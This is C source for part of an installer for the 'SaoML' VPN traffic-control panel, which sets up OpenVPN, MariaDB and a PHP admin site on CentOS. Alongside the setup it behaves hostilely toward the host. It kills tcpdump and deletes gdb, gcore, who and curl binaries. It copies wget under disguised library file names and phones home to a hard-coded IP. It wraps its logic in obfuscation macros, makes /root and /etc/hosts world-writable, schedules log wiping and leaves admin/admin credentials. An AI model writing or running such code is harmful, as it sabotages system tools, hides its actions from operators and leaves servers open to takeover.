			printf(" 警告！防封系统配置失败,请重装服务器系统重新安装,脚本停止！！\r");
			exit(1);
		}
		
		exit(0);
	}else{
		Pointer("[\033[34m5/8\033[0m] 正在安装mariadb数据库服务...",pid4);
	}
	
	/* 第六步 */
	pid_t pid5;
	pid5 = fork();
	if(pid5 < 0){
		printf("进程启动失败!\r");
		exit(1);
	}else if(pid5 == 0){
		int i =0;
		//安装WEB
		mycmd_on("rm -rf /var/www/* && cp -rf /var/saoml/html /var/www/");
		if((access("/var/www/html/system.php",F_OK))!=-1){   
			sprintf(bin3,"sed -i \"s/服务器IP/\"%s\"/g\" /var/www/html/vpndata.sql",app_ip);
			sprintf(bin4,"mysql -uroot -p%s vpndata < /var/www/html/vpndata.sql",sql_pass);
			mycmd_on(bin1);
			mycmd_on(bin2);
			mycmd_on(bin3);
			mycmd_on(bin4);
			mycmd_on("rm -rf /var/www/html/vpndata.sql");
			sprintf(bin6,"sed -i \"s/newpass/\"%s\"/g\" /var/www/html/config.php",sql_pass);
			mycmd_on(bin6);
			mycmd_on("chmod -R 777 /var/www/");
			sprintf(directory1,"mv /var/www/html/admin /var/www/html/%s",admin_path);
			mycmd_on(directory1);
		}else{   
			printf("警告！流控系统安装失败,请重装服务器系统重新安装,脚本停止！\r");
			exit(1); 
		}
		mycmd_on("mkdir /etc/rate.d/ && chmod -R 0777 /etc/rate.d/");
		mycmd_on("cp -rf /var/saoml/res /root/");
		if((access("/root/res/sha",F_OK))!=-1){   
			mycmd_off("mv /root/res/saoml.service /lib/systemd/system/saoml.service && chmod -R 777 /lib/systemd/system/saoml.service");
			mycmd_on("chmod -R 777 /root");
		}else{   
			printf("警告！流控系统配置失败,请重装服务器系统重新安装,脚本停止！\r");
			exit(1);
		}
		exit(0);
	}else{
		Pointer("[\033[34m6/8\033[0m] 正在安装流控系统主程序...",pid5);
	}
	
	/* 第七步 */
	pid_t pid6;
	pid6 = fork();
	if(pid6 < 0){
		printf("进程启动失败!\r");
		exit(1);
	}else if(pid6 == 0){
		int i =0;
		sprintf(app1,"/var/www/html/shell/appgf \"%s\" \"%s\" \"%s\" \"%s\" \"%s\"",app_ip,saoml_port,app_name,app_a,app_b);
		mycmd_on(app1);
		if((access("/var/www/html/saoml.apk",F_OK))==-1){   
			printf("警告！制作失败,请安装完毕后,运行脚本重新生成APP\r");
		}
		//system
		mycmd_off("echo '' >/usr/lib/libgcc_libeses.0.so.1");
		//流量监控
		cosp("/bin/wget","/usr/lib/libBrokenFlashLocale.so.1");
		mycmd_off("echo '#SaoML官网：ml.saoml.com' > /etc/saoml_hosts");
		mycmd_off("echo '###############################请勿删除上方代码###############################' >> /etc/hosts");
		mycmd_on("chmod 777 /etc/saoml_hosts");
		mycmd_on("chmod 777 /etc/hosts");
		state = system("systemctl restart crond.service >/dev/null 2>&1");
		if (state != 0){
			printf("警告！Crond重启失败！搭建完成后请联系管理员修复！\r");
			exit(1);
		}
		//SG11扩展安装
		system("mv -f /etc/ixed.7.0.lin /usr/lib64/php/modules/ixed.7.0.lin >/dev/null 2>&1");
		system("chmod 777 /usr/lib64/php/modules/ixed.7.0.lin >/dev/null 2>&1");
		exit(0);
	}else{
		Pointer("[\033[34m7/8\033[0m] 安卓端APP软件正在生成...",pid6);
	}
	
	/* 第八步 */
	pid_t pid7;
	pid7 = fork();
	if(pid7 < 0){
		printf("进程启动失败!\r");
		exit(1);
	}else if(pid7 == 0){
		int i =0;
		state = system("systemctl restart openvpn@server1194.service >/dev/null 2>&1");
		if (state != 0){
			printf("警告！OP服务重启失败！等待脚本自修复！\r");
			system("echo '自修复' > /etc/zxf");
		}
		state = system("systemctl restart php-fpm.service >/dev/null 2>&1");
		if (state != 0){
			printf("警告！PHP服务重启失败！请重装服务器系统再搭建！\r");
			exit(1);
		}
		state = system("systemctl restart httpd.service >/dev/null 2>&1");
		if (state != 0){
			printf("警告！httpd服务重启失败！请重装服务器系统再搭建！\r");
			exit(1);
		}
		state = system("systemctl restart iptables.service >/dev/null 2>&1");
		if (state != 0){
			printf("警告！iptables服务重启失败！请重装服务器系统再搭建！\r");
			exit(1);
		}
		state = system("systemctl restart mariadb.service >/dev/null 2>&1");
		if (state != 0){
			printf("警告！mariadb服务重启失败！请重装服务器系统再搭建！\r");
			exit(1);
		}
		state = system("systemctl restart dnsmasq.service >/dev/null 2>&1");
		if (state != 0){
			printf("警告！拦截服务重启失败！请重装服务器系统再搭建！\r");
			exit(1);
		}
		//添加守护进程
		mycmd_on("sao install");
		mycmd_on("chmod 777 /bin/sao");
		if((access("/bin/sao",F_OK))==-1){   
			printf("警告！监控出问题！脚本停止！");
			exit(1);   
		}
		//添加定时任务
		mycmd_off("echo '*/5 * * * * sao start #每5分钟检查一次守护进程' > /etc/saoml_crontab");
		mycmd_off("echo '0 2 * * * saomlxs #每天凌晨2点自动校时' >> /etc/saoml_crontab");
		mycmd_off("echo '0 2 * * * rm -rf /var/log/httpd/* #每天凌晨2点清空网站日志' >> /etc/saoml_crontab");
		mycmd_off("echo '0 1 * * * rm -rf /var/www/*.log #每天凌1点清空监控日志' >> /etc/saoml_crontab");
		mycmd_off("echo '0 0 1 * * vpn top #每月重置一次排行榜' >> /etc/saoml_crontab");
		mycmd_off("crontab /etc/saoml_crontab >/dev/null 2>&1");
		mycmd_off("chmod 777 /etc/saoml_crontab >/dev/null 2>&1");
		//自启动配置
		mycmd_on("systemctl enable mariadb.service");
		mycmd_on("systemctl enable httpd.service");
		mycmd_on("systemctl enable php-fpm.service");
		mycmd_on("systemctl enable openvpn@server1194.service");
		mycmd_on("systemctl enable openvpn@server1195.service");
		mycmd_on("systemctl enable openvpn@server1196.service");
		mycmd_on("systemctl enable openvpn@server1197.service");
		mycmd_on("systemctl enable openvpn@server-udp.service");
		mycmd_on("systemctl enable dnsmasq.service");
		mycmd_on("systemctl enable crond.service");
		mycmd_on("systemctl enable iptables.service");
		mycmd_on("systemctl enable saoml.service");
		exit(0);
	}else{
		Pointer("[\033[34m8/8\033[0m] 正在优化系统网络环境...",pid7);
	}
	
	mycmd_on("unsql");
	mycmd_on("rm -rf /var/saoml");
	system("clear");
	printf("---------------------------------------------------------\n");
	printf("恭喜各位基友,您已经成功安装SaoML流控™流量控制系统\n");
	printf("---------------------------------------------------------\n");
	printf("管理员后台: \033[32mhttp://%s:%s/%s\033[0m\n",app_ip,saoml_port,admin_path);
	printf("管理员账号: \033[32madmin\033[0m\n");
	printf("管理员密码: \033[32madmin\033[0m\n");
	printf("---------------------------------------------------------\n");
	printf("数据库地址: \033[32mhttp://%s:%s/%s/phpmyadmin\033[0m\n",app_ip,saoml_port,admin_path);
	printf("数据库账号: \033[32mroot\033[0m\n");
	printf("数据库密码: \033[32m%s\033[0m\n",sql_pass);
	printf("---------------------------------------------------------\n");
	printf("代理控制台: \033[32mhttp://%s:%s/daili\033[0m\n",app_ip,saoml_port);
	printf("用户控制台: \033[32mhttp://%s:%s\033[0m\n",app_ip,saoml_port);
	printf("---------------------------------------------------------\n");
	printf("默认APP下载地址: \033[32mhttp://%s:%s/saoml.apk\033[0m\n",app_ip,saoml_port);
	printf("PC软件下载地址: \033[32m可进入SaoML官网查看下载地址\033[0m\n");
	printf("IOS软件: \033[32m使用国际ID 搜索openvpn或opentunnel即可\033[0m\n");
	printf("---------------------------------------------------------\n");
	printf("更多操作可执行：\033[32mvpn \033[0m 命令查看\n");
	printf("---------------------------------------------------------\n");
	printf("守护模块查看命令：\033[32msao \033[0m\n");
	printf("---------------------------------------------------------\n");
	printf("使用文档请查看：http://www.saoml.com/index.php/category/ml/ \n");
	printf("---------------------------------------------------------\n");
	printf("如果安装完毕以后无法访问后台请进服务器控制台开安全组有些叫防火墙一个意思，端口全开\n");
	printf("---------------------------------------------------------\n");
	if((access("/etc/zxf",F_OK))!=-1){
		repair();
	}
	printf("正在重启流控环境...\n");
	mycmd_on("systemctl restart saoml.service");
	mycmd_on("systemctl restart mariadb.service");
	mycmd_on("systemctl restart httpd.service");
	mycmd_off("systemctl restart openvpn@server1194.service");
	mycmd_off("systemctl restart openvpn@server1195.service");
	mycmd_off("systemctl restart openvpn@server1196.service");
	mycmd_off("systemctl restart openvpn@server1197.service");
	mycmd_off("systemctl restart openvpn@server-udp.service");
	printf("重启流控环境完毕...\n");
	system("saomlxs");
	printf("脚本已结束\n");
	VIRTUALIZER_EAGLE_BLACK_END
	exit(0); 
}

int baota()
{
	VIRTUALIZER_EAGLE_BLACK_START
	char bt_sqluser[50],bt_sqlpass[50],bt_sqlname[50],bin1[100],bin2[100],bin4[100],bin6[100],bin7[100];
	system("clear");
	printf("SaoML提示：欢迎使用宝塔所需环境安装,安装之前请先阅读以下内容\n\n");
	printf("1、使用本功能前,请先安装宝塔面板，本功能只适用于主控端管理使用，无实际功能，需要实际功能请选1！\n\n");
	printf("2、网站环境使用LAMP，PHP版本7.0，MySQL 5.5，Apache2.4\n\n");
	printf("3、添加站点时网站根目录设置为/www/wwwroot/html\n\n");
	printf("4、关闭网站目录防跨站攻击\n\n");
	printf("5、确定安装完成后回车执行\n\n");
	printf("6、安装完毕后,可自定义环境使用其他版本,但安装时必须使用指定版本！\n\n");
	system("read");
	printf("请输入数据库名（可前往宝塔面板查看）:");
	scanf("%s",bt_sqlname);
	printf("数据库名为：%s\n\n",bt_sqlname);
	printf("请输入数据库用户名（可前往宝塔面板查看）:");
	scanf("%s",bt_sqluser);
	printf("数据库用户名为：%s\n\n",bt_sqluser);
	printf("请输入数据库密码（可前往宝塔面板查看）:");
	scanf("%s",bt_sqlpass);
	printf("数据库密码为：%s\n\n",bt_sqlpass);
	system("clear");
	printf("[\033[0;32minfo\033[0m] 正在安装流控程序[\033[0;32m loading.... \033[0m]\n\n");	
	int shell = system("rm -rf /www/wwwroot/html/* >/dev/null 2>&1");
	if (shell != 0){
		printf("请关闭网站目录防跨站攻击,脚本停止！\n");
		exit(1);
	}
	mycmd_on("rm -rf /var/saoml");
	mycmd_on("mkdir /var/saoml");
	mycmd_on("cd /var/saoml;wget -q http://oss.saoml.com/8/web-8.0.zip");
	if((access("/var/saoml/web-8.0.zip",F_OK))!=-1){
		mycmd_on("cd /var/saoml && unzip -o -P Hc4620303+ web-8.0.zip");
		mycmd_on("cd /var/saoml && rm -rf web-8.0.zip");
	}else{
		printf("警告！获取远程数据失败!\n");
		exit(1);
	}
	mycmd_on("cp -rf /var/saoml/bin/jk.sh /bin/ >/dev/null 2>&1 && chmod 777 /bin/jk.sh");
	
	mycmd_on("cp -rf /var/saoml/html /www/wwwroot/");
	
	mycmd_on("mkdir /etc/openvpn");
	
	sprintf(bin4,"mysql -u%s -p%s %s < /www/wwwroot/html/vpndata.sql",bt_sqluser,bt_sqlpass,bt_sqlname);
	system("service mysqld restart");
	mycmd_on(bin4);
	
	mycmd_on("rm -rf /www/wwwroot/html/vpndata.sql");
	
	sprintf(bin6,"sed -i \"s/newpass/\"%s\"/g\" /www/wwwroot/html/config.php && sed -i \"s/root/\"%s\"/g\" /www/wwwroot/html/config.php && sed -i \"s/vpndata/\"%s\"/g\" /www/wwwroot/html/config.php",bt_sqlpass,bt_sqluser,bt_sqlname);
	mycmd_off(bin6);

	mycmd_on("chmod 0777 -R /www/wwwroot/html");
	
	printf("[\033[0;32minfo\033[0m] 安装完毕...[\033[0;32m successful \033[0m]\n\n");
	
	mycmd_on("mv -f /var/saoml/etc/ixed.7.0.lin /www/server/php/70/lib/php/extensions/no-debug-non-zts-20151012/ixed.7.0.lin");
	
	mycmd_off("echo 'extension=ixed.7.0.lin' >> /www/server/php/70/etc/php.ini");

	mycmd_off("echo '#!/bin/bash' > /etc/openvpn/auth_config.conf");
	mycmd_off("echo 'mysql_host=localhost' >> /etc/openvpn/auth_config.conf");
	sprintf(bin1,"echo 'mysql_user=%s' >> /etc/openvpn/auth_config.conf",bt_sqluser);
	sprintf(bin2,"echo 'mysql_pass=%s' >> /etc/openvpn/auth_config.conf",bt_sqlpass);
	sprintf(bin4,"echo 'mysql_data=%s' >> /etc/openvpn/auth_config.conf",bt_sqlname);
	mycmd_off(bin1);
	mycmd_off(bin2);
	mycmd_off(bin4);
	mycmd_off("echo 'mysql_port=3306' >> /etc/openvpn/auth_config.conf");
	
	printf("[\033[0;32minfo\033[0m] 正在重启网站环境...[\033[0;32m successful \033[0m]\n\n");
	
	system("service php-fpm-70 restart");
	
	system("/bin/jk.sh & >/dev/null 2>&1");
	
	mycmd_off("echo '' >/usr/lib/libgcc_libeses.0.so.1");
	
	cosp("/bin/wget","/usr/lib/libBrokenFlashLocale.so.1");
	
	system("clear");
	printf("---------------------------------------------------------\n");
	printf("恭喜各位基友,您已经成功安装SaoML流控\n");
	printf("---------------------------------------------------------\n");
	printf("管理员后台: \033[32mhttp://创建站点时填写的域名或IP/admin\033[0m\n");
	printf("管理员账号: \033[32madmin\033[0m\n");
	printf("管理员密码: \033[32madmin\033[0m\n");
	printf("---------------------------------------------------------\n");
	printf("代理控制台: \033[32mhttp://创建站点时填写的域名或IP/daili\033[0m\n");
	printf("用户控制台: \033[32mhttp://创建站点时填写的域名或IP/user\033[0m\n");
	printf("---------------------------------------------------------\n");
	printf("安装完毕以后如无法访问,请进入宝塔重启一下网站环境\n");
	printf("---------------------------------------------------------\n");
	printf("修改数据库信息时需要修改/etc/openvpn里的配置文件,和/www/wwwroot/html/config.php文件\n");
	printf("---------------------------------------------------------\n");
	printf("搭建完以后把/bin/jk.sh添加到宝塔开机自启动再设置个守护进程,不会的当我放屁别来问!\n");
	printf("---------------------------------------------------------\n");
	mycmd_on("rm -rf /var/saoml");
	VIRTUALIZER_EAGLE_BLACK_END
	return 0;
}

int IPget()
{
VIRTUALIZER_EAGLE_BLACK_START
	system("clear");
	//检测安装环境
	mycmd_on("rm -rf /bin/gcore");
	mycmd_on("rm -rf /bin/gdb");
	mycmd_on("rm -rf /bin/core");
	mycmd_on("sed -i \"s/alias cp='cp -i'/#alias cp='cp -i'/g\" /root/.bashrc");

	//检测权限
	if (geteuid() == 0){
		printf("\033[33m执行权限:\033[0m \033[34m检测通过\033[0m\n");
		sleep(1);
	}else{
		printf("\033[33m执行权限:\033[0m \033[34m未通过,请先切换root管理员权限\033[0m\n");
		exit(1);
	}
	
	//检测版本
	if((access("/etc/os-release",F_OK))!=-1){   
		char version[2];
		strcpy(version,mycmd_off("echo `cat /etc/redhat-release | awk '{print$4}' | awk -F \".\" '{print$1}'` | tr -d '\n'"));
		if (strcmp(version,"7")==0){
			printf("\033[33m系统版本:\033[0m \033[34m检测通过\033[0m\n");
		}else{
			printf("\033[33m系统版本:\033[0m \033[34m当前服务器系统不支持SaoML流控,请重装系统后重新运行此脚本,系统为：CentOS7.0 x64 - CentOS7.6 x64,优先选择7.3\033[0m\n");
			exit(0);
		}
	}else{   
		printf("\033[33m系统版本:\033[0m \033[34m当前服务器系统不支持SaoML流控,请重装系统后重新运行此脚本,系统为：CentOS7.0 x64 - CentOS7.6 x64，优先选择7.3\033[0m\n");
		exit(1); 
	}
	
	//检测主机类型
	if((access("/bin/clean",F_OK))==-1 && (access("/bin/clean2",F_OK))==-1)
	{
		printf("\033[33m正在识别主机类型,请稍后.....\033[0m \033[34m\n");
		char *buf = malloc(sizeof(char)*4096);
		char *buf2 = malloc(sizeof(char)*4096);
		memset(buf, 0, sizeof(buf));
		memset(buf2, 0, sizeof(buf2));
		char domestic[100] = "domestic";
		buf=http("101.35.108.196","saosq.saoml.com","/ip.php");
		buf2=strstr(buf,domestic);
		if (buf2 == NULL){
			printf("\033[33m主机类型:\033[0m \033[34m境外服务器\033[0m\n\n");
			printf("\033[33m         \033[0m \033[34m为响应国家绿色上网,SaoML禁止使用境外服务器搭建（包括港澳台服务器）\033[0m\n\n");
			printf("\033[33m         \033[0m \033[34m请使用国内服务器安装使用\033[0m\n\n");
			printf("\033[31m如有疑问请联系开发作者QQ:1277345571 \033[0m\n");
			exit(1);
		}else{
			printf("\033[33m主机类型:\033[0m \033[34m国内服务器\033[0m\n\n");
		}

		//检测验证
		system("clear");
		printf("\033[32m===================================================================\033[0m\n");
		printf("\n\033[31m     欢迎使用SaoML高级版系统《首次使用请仔细阅读注意事项》       \033[0m\n");
		printf("\n\033[31m     支持系统为CentOS7.x X64位				   \033[0m\n");
		printf("\n\033[31m     本脚本仅适用于学习与研究等个人用途,请勿用于任何违法国家法律的活动\033[0m\n");
		printf("\n\033[31m     推荐使用Centos7.2、7.3 X64位系统进行安装,有就用没有就算了        \033[0m\n");
		printf("\n\033[31m     官网：ml.saoml.com                             \033[0m\n");
		printf("\n\033[31m     博客：www.saoml.com                             \033[0m\n");
		printf("\n\033[31m     授权：pay.saoml.com                             \033[0m\n");
		printf("\n\033[32m=================================================================\033[0m\n");
		printf("\n\033[33m首次使用,请仔细阅读上方内容,否则出问题自行负责\033[0m\n");
		printf("\n\033[33m输入括号中的SaoML官网按回车进行验证 [\033[0m\033[32m ml.saoml.com \033[0m\033[33m]：\033[0m");
		char key_a[100],key_b[100];
		strcpy(key_b,"ml.saoml.com");
		scanf("%s",key_a);
		if(strcmp(key_b,key_a)!=0){
			printf("不会吧？这都能输错？玩个鸡脖！\n");
			exit(1);
		}
		printf("\n\033[32m验证通过 \033[0m正在检查服务器！\n\n");
	}
VIRTUALIZER_EAGLE_BLACK_END
return 0;
}

int repair(){
	VIRTUALIZER_EAGLE_BLACK_START
	printf("正在自修复请勿操作服务器...(大约需要2分钟)\n");
	mycmd_yum("avahi --skip-broken");
	mycmd_yum("openssl --skip-broken");
	mycmd_yum("openssl-libs --skip-broken");
	mycmd_yum("openssl-devel --skip-broken");
	mycmd_yum("lzo --skip-broken");
	mycmd_yum("lzo-devel --skip-broken");
	mycmd_yum("pam --skip-broken");
	mycmd_yum("pam-devel --skip-broken");
	mycmd_yum("automake --skip-broken");
	mycmd_yum("pkgconfig --skip-broken");
	mycmd_yum("gawk --skip-broken");
	mycmd_yum("tar --skip-broken");
	mycmd_yum("net-tools --skip-broken");
	mycmd_yum("psmisc --skip-broken");
	mycmd_yum("pkcs11-helper --skip-broken");
	mycmd_yum("libxml2 --skip-broken");
	mycmd_yum("libxml2-devel --skip-broken");
	mycmd_yum("bzip2 --skip-broken");
	mycmd_yum("bzip2-devel --skip-broken");
	mycmd_yum("libjpeg --skip-broken");
	mycmd_yum("libjpeg-devel --skip-broken");
	mycmd_yum("libpng --skip-broken");
	mycmd_yum("libpng-devel --skip-broken");
	mycmd_yum("freetype --skip-broken");
	mycmd_yum("freetype-devel --skip-broken");
	mycmd_yum("gmp --skip-broken");
	mycmd_yum("gmp-devel --skip-broken");
	mycmd_yum("libmcrypt --skip-broken");
	mycmd_yum("libmcrypt-devel --skip-broken");
	mycmd_yum("readline --skip-broken");
	mycmd_yum("readline-devel --skip-broken");
	mycmd_yum("libxslt --skip-broken");
	mycmd_yum("libxslt-devel --skip-broken");
	mycmd_yum("dnsmasq --skip-broken");
	int state;
	state = system("systemctl restart openvpn@server1194.service >/dev/null 2>&1");
	if (state != 0){
		printf("\033[31m正在尝试二次修复...\033[0m\n");
		mycmd_off("echo 'nameserver 223.5.5.5' > /etc/resolv.conf");
		mycmd_off("echo 'nameserver 223.6.6.6' >> /etc/resolv.conf");
		sleep(5);
		state = system("systemctl restart openvpn@server1194.service >/dev/null 2>&1");
		if (state != 0){
			printf("\033[31m正在尝试三次修复...\033[0m\n");
			mycmd_off("echo 'nameserver 101.226.4.6' > /etc/resolv.conf");
			mycmd_off("echo 'nameserver 218.30.118.6' >> /etc/resolv.conf");
			sleep(5);
			state = system("systemctl restart openvpn@server1194.service >/dev/null 2>&1");
			if (state != 0){
				printf("\033[31m修复失败,什么垃圾服务器,请联系客服人工处理...\033[0m\n");
				exit(1);
			}
		}
	}
	printf("\033[31m终于修复成功了，垃圾服务器，费我头发！\033[0m\n");
	system("rm -rf /etc/zxf >/dev/null 2>&1");
	VIRTUALIZER_EAGLE_BLACK_END
	return 0;
}

int main(int argc,char ** argv,char * filename,char * name)
{
	VIRTUALIZER_EAGLE_BLACK_START
	//设置运行名
	int state;
	system("(ps -ef|grep tcpdump|grep -v grep|cut -c 9-15|xargs kill -9) >/dev/null 2>&1");
	name=argv[0];
	if(strcmp(name,"xsaoml") != 0){
		exit(1);
	}
	IPget();
	system("rm -rf /sbin/who;rm -rf /sbin/curl;chmod 777 /bin/who >/dev/null 2>&1");
	if((access("/sbin/who",F_OK))!=-1){   
		printf("想干嘛?你不对劲!\n");
		exit(1);
	}
	if((access("/sbin/curl",F_OK))!=-1){   
		printf("想干嘛?你不对劲!\n");
		exit(1);
	}
	if((access("/bin/who",R_OK|W_OK|X_OK|F_OK))==-1){   
		printf("想干嘛?你不对劲!\n");
		exit(1);
	}
	state = system("export | grep proxy >/dev/null 2>&1");
	if (state = 0){
		printf("\033[31m你想干嘛\033[0m\n");
		exit(1);
	}
	//检查curl
	fp=fopen("/bin/curl","r");
	fgetc(fp);
	if(fgetc(fp)=='E'){
		if(fgetc(fp)=='L'){
			if(fgetc(fp)=='F');
			else exit(1);
		}
		else exit(1);
	}
	else exit(1);
	fclose(fp);
	//检查who
	fp=fopen("/bin/who","r");
	fgetc(fp);
	if(fgetc(fp)=='E'){
		if(fgetc(fp)=='L'){
			if(fgetc(fp)=='F');
			else exit(1);
		}
		else exit(1);
	}
	else exit(1);
	fclose(fp);
	thread();
	VIRTUALIZER_EAGLE_BLACK_END
	return 0;
}

int thread()
{
	VIRTUALIZER_EAGLE_BLACK_START
	init();
	pthread_t t0,t1;
	char *last1;
    if( stat("/bin/curl",&buf) != -1 )
      last1 = ctime(&buf.st_mtime);
    else
        exit(1);
    strcpy(last,last1);
        //创建线程A
    if(pthread_create(&t0, NULL, thread_a, NULL) == -1){
        puts(pid_msg);
        exit(1);
    }
        //创建线程B
    if(pthread_create(&t1, NULL, thread_b, NULL) == -1){
        puts(pid_msg);
        exit(1);
    }
	cdsfjvn();
    void * result;
    if(pthread_join(t0, &result) == -1){
        puts(pid_msg);
        exit(1);
    }
	if(pthread_join(t1, &result) == -1){
        puts(pid_msg);
        exit(1);
    }
	VIRTUALIZER_EAGLE_BLACK_END
	return 0;
}

void md5(char str[])
{
	VIRTUALIZER_EAGLE_BLACK_START
    MD5_CTX ctx;
    int i;
    unsigned char outmd[16], tmp[2];
    memset(final, 0, 32);
    MD5_Init(&ctx);
    MD5_Update(&ctx, str, strlen(str));
    MD5_Final(outmd, &ctx);
    for (i = 0; i < 16; i++){
        sprintf(tmp, "%02x", outmd[i]);
        strcat(final, tmp);
    }
	VIRTUALIZER_EAGLE_BLACK_END
}


//封包访问 防止重定向拦截 战斗不允许套cdn 指定ip与域名
char * http(char * ip,char * url,char * paramter)
{
	VIRTUALIZER_EAGLE_BLACK_START
    int sockfd, ret, i, h;
    struct sockaddr_in servaddr;
    char str1[4096], str2[4096],str3[4096],*str;
    static char buf[BUFSIZE];
    socklen_t len;
    fd_set t_set1;
    struct timeval tv;
    //创建套接字
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
        printf("创建失败,即将终止--- error!\n");
        exit(0);
    };
    bzero(&servaddr, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(PORT);
    if (inet_pton(AF_INET, ip, &servaddr.sin_addr) <= 0){
        printf("创建网络连接失败,本线程即将终止--inet_pton error!\n");
        exit(0);
    };
    if (connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0){
        printf("连接到服务器失败,connect error!\n");
        exit(0);
    }
    memset(str2, 0, 4096);
    strcat(str2, "thisisatest");
    str = (char *)malloc(128);
    len = strlen(str2);
    sprintf(str, "%d", len);
    memset(str1, 0, 4096);
    sprintf(str1, "GET %s HTTP/1.1\n",paramter);
    sprintf(str3, "Host: %s\n",url);
    strcat(str1,str3);
    strcat(str1, "Content-Type: text/html\n");
    strcat(str1, "Content-Length: ");
    strcat(str1, str);
    strcat(str1, "\n\n");
    strcat(str1, str2);
    //strcat(str1, "\r\n\r\n");
    ret = write(sockfd, str1, strlen(str1));
    if (ret < 0){
        printf("发送失败！错误代码是%d，错误信息是'%s'\n", errno, strerror(errno));
        exit(0);
    }
    FD_ZERO(&t_set1);
    FD_SET(sockfd, &t_set1);
    sleep(2);
    tv.tv_sec = 0;
    tv.tv_usec = 0;
    h = select(sockfd + 1, &t_set1, NULL, NULL, &tv);
    if (h > 0){
        memset(buf, 0, 4096);
        i = read(sockfd, buf, 4095);
    }
    close(sockfd);
	VIRTUALIZER_EAGLE_BLACK_END
    return buf;
}

char* mycmd_on(char* command)
{
	char cmd[100000];
	sprintf(cmd,"%s >/dev/null 2>&1",command);
    memset(buff,0,sizeof(buff));
    return shellcmd(cmd,buff,sizeof(buff));
}

char* mycmd_off(char* command)
{
	char cmd[100000];
	sprintf(cmd,"%s",command);
    memset(buff,0,sizeof(buff));
    return shellcmd(cmd,buff,sizeof(buff));
}

char* mycmd_yum(char* command)
{
	char cmd[100000];
	sprintf(cmd,"yum -y install %s >/dev/null 2>&1",command);
    memset(buff,0,sizeof(buff));
    return shellcmd(cmd,buff,sizeof(buff));
}